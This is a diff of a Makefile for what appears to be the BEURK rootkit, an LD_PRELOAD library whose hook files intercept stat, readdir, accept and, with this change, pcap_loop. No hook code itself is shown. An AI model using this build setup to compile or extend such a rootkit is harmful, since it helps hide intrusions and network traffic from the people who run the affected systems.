@@ -21,7 +21,7 @@ BEURK_INFECT_ABSPATH	?= $(BEURK_INFECT_DIR)/$(BEURK_LIBRARY_NAME)
 
 # compiler options
 INCLUDES	:= -Iincludes
-CFLAGS		= $(INCLUDES) -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE
+CFLAGS		= $(INCLUDES) -Wall -Wextra -Winline -Wunknown-pragmas
 LDLIBS		= -lc -lutil -lpam -lgcov
 # unix systems provides dlsym()/dlopen() symbols on libc
 ifeq ($(UNAME), Linux)
@@ -56,7 +56,8 @@ SOURCES		= src/init.c \
 			  src/hooks/__xstat.c \
 			  src/hooks/stat64.c \
 			  src/hooks/__xstat64.c \
-			  src/hooks/accept.c
+			  src/hooks/accept.c \
+			  src/hooks/pcap_loop.c
 # doesn't exist on unix systems
 ifeq ($(UNAME), Linux)
     SOURCES	+= src/hooks/readdir64.c
